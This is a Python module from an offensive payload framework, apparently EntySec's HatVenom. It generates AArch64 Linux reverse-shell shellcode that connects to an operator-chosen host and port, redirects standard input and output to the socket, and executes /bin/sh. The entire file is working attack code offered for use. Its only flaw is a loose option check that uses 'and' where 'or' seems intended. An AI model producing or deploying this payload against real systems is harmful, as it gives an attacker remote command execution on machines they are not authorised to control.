#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2022 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatvenom import HatVenom


class ShellReverseTCP(HatVenom):
    def generate(self, options={}):
        if 'RHOST' not in options and 'RPORT' not in options:
            return b''

        rhost = self.convert_host(options['RHOST'])
        rport = self.convert_port(options['RPORT'])

        shellcode = f"""
        start:
            mov x0, 0x2
            mov x1, 0x1
            mov x2, 0
            mov x8, 0xc6
            svc 0
            mov x3, x0

            adr x1, sockaddr
            mov x2, 0x10
            mov x8, 0xcb
            svc 0
            cbnz w0, exit

            mov x0, x3
            mov x2, 0
            mov x1, 0x0
            mov x8, 0x18
            svc 0
            mov x1, 0x1
            mov x8, 0x18
            svc 0
            mov x1, 0x2
            mov x8, 0x18
            svc 0

            adr x0, shell
            mov x2, 0
            str x0, [sp, 0]
            str x2, [sp, 8]
            mov x1, sp
            mov x8, 0xdd
            svc 0

        exit:
            mov x0, 0
            mov x8, 0x5d
            svc 0

        .balign 4
        sockaddr:
            .short 0x2
            .short 0x{rport.hex()}
            .word 0x{rhost.hex()}

        shell:
            .word 0x6e69622f
            .word 0x0068732f
            .word 0x00000000
            .word 0x00000000
        """

        return self.assemble('aarch64', shellcode)
